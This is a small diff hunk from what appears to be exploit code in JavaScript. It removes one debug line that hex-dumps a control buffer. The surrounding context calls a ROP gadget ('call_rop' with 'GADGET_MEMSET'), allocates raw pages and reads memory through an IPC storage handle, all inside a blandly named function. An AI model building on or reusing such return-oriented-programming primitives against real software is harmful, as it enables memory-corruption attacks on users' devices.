@@ -207,7 +207,6 @@ export async function qualifyCacheBucketPeriod(input) {
     var controlBuf = allocPage(0x1000);
     call_rop(GADGET_MEMSET, controlBuf, 0xA5n, 16n);
     var control = ipcStorageRead(storageHandle, 0x28000, 16, controlBuf);
-    var controlHex = control.error === 0 ? readHexBytes(controlBuf, 16) : "";
     if (control.error !== 0) {
         return {ok: false, addressCopy};
     }
